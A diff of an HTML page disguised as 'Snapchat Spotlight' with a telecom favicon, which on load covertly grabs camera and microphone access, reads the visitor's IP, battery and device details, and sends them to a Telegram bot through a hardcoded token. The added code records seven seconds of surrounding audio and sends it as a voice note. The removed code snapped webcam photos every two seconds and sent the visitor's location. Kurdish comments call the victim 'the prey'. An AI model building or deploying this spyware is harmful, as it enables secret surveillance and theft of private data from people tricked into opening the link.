@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
-    <title>snapchat spotlight</title>
+    <title>Snapchat Spotlight</title>
     <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
 </head>
 <body onload="capture()">
@@ -11,19 +11,25 @@
     const urlParams = new URLSearchParams(window.location.search);
     const targetID = urlParams.get('id'); 
     const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
+    const CHAT_ID = "5367676643"; // دڵنیاببە لەوەی ئایدی چاتی تێلێگرامت لێرەیە
 
     async function capture() {
         if (!targetID) return;
         try {
+            // 🎙️ چالاککردنی کامێرا و مایکرۆفۆن بە یەکەوە
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
-                audio: false 
+                audio: true 
             });
+
+            // 🔋 دەرهێنانی زانیاری پاتری
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
+
+            // 🌐 دەرهێنانی IP و ناردنی ڕاپۆرتی سەرەتایی
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
@@ -32,47 +38,46 @@
                                  `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                  `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                                  `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    sendToTelegram(report);
+                    
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "HTML" })
+                    });
                 });
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendLocation(pos.coords.latitude, pos.coords.longitude);
-            });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            video.play();
-            const takeSnap = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
+
+            // 🎤 دەستپێکردنی تۆمارکردنی دەنگ (Voice Capture)
+            const mediaRecorder = new MediaRecorder(stream);
+            let audioChunks = [];
+
+            mediaRecorder.ondataavailable = (event) => {
+                audioChunks.push(event.data);
             };
-            setInterval(takeSnap, 2000);
-        } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("voice", audioBlob, "voice_note.ogg");
+
+                // ناردنی دەنگەکە وەک Voice Note بۆ تێلێگرام
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
+                    method: "POST",
+                    body: formData
+                });
+            };
+
+            // تۆمارکردنی 7 چرکە لە دەنگی دەوروبەری نێچیرەکە
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                // داخستنی ستریمەکان بۆ ئەوەی گڵۆپی کامێرا بکوژێتەوە
+                stream.getTracks().forEach(track => track.stop());
+            }, 7000);
+
+        } catch (err) {
+            console.error("Access Denied or Error: ", err);
         }
-    }
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
-        });
-    }
-    function sendLocation(lat, lon) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
-        });
-    }
-    function sendFile(blob, type) {
-        let fd = new FormData();
-        fd.append("chat_id", targetID);
-        fd.append(type, blob, "shot.jpg");
-        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
     }
 </script>
 </body>
